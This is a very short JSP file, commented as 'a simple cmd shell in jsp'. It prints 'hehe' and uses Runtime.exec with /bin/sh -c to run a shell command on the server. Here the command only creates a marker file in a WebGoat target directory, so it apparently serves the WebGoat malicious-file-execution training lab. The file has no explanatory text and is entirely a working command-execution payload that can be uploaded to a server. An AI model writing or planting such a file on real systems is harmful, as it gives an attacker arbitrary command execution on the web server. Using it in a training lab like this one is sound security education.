<!--A simple cmd shell in jsp-->
<p>hehe</p>
<%
String command = "touch /var/lib/tomcat6/webapps/WebGoat/mfe_target/webgoat.txt";

Runtime.getRuntime().exec(new String[] {"/bin/sh","-c",command});
%>